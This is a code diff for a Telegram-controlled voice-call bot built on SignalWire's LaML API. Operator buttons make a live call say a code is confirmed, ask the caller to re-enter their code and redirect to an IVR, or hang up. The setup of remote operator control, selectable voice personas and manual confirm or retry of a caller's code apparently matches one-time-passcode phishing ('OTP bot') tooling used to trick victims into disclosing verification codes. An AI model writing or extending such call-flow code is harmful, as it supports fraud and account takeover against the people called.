@@ -236,16 +236,72 @@ if(callback){
 const action=callback.data
 
 if(action==="confirm"){
-await endCall()
-tgSend("✔ Confirmed")
+
+await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
+method:"POST",
+headers:{
+Authorization:auth(),
+"Content-Type":"application/x-www-form-urlencoded"
+},
+body:new URLSearchParams({
+Twiml:`
+<Response>
+<Say voice="${assistants[settings.assistant].voice}">
+Thank you. Your code has been confirmed. Have a great day.
+</Say>
+<Hangup/>
+</Response>
+`
+})
+})
+
+tgSend("✔ Code confirmed")
+activeCallSid=null
+updatePanel()
+
 }
 
 if(action==="retry"){
-await retryCall()
+
+await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
+method:"POST",
+headers:{
+Authorization:auth(),
+"Content-Type":"application/x-www-form-urlencoded"
+},
+body:new URLSearchParams({
+Twiml:`
+<Response>
+<Say voice="${assistants[settings.assistant].voice}">
+Please re-enter your code.
+</Say>
+<Redirect>${BASE_URL}/ivr</Redirect>
+</Response>
+`
+})
+})
+
+tgSend("🔁 Asked caller to re-enter code")
+
 }
 
 if(action==="hangup"){
-await endCall()
+
+await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
+method:"POST",
+headers:{
+Authorization:auth(),
+"Content-Type":"application/x-www-form-urlencoded"
+},
+body:new URLSearchParams({
+Twiml:`<Response><Hangup/></Response>`
+})
+})
+
+tgSend("⛔ Call ended")
+activeCallSid=null
+updatePanel()
+
 }
 
 if(action==="calllast"){
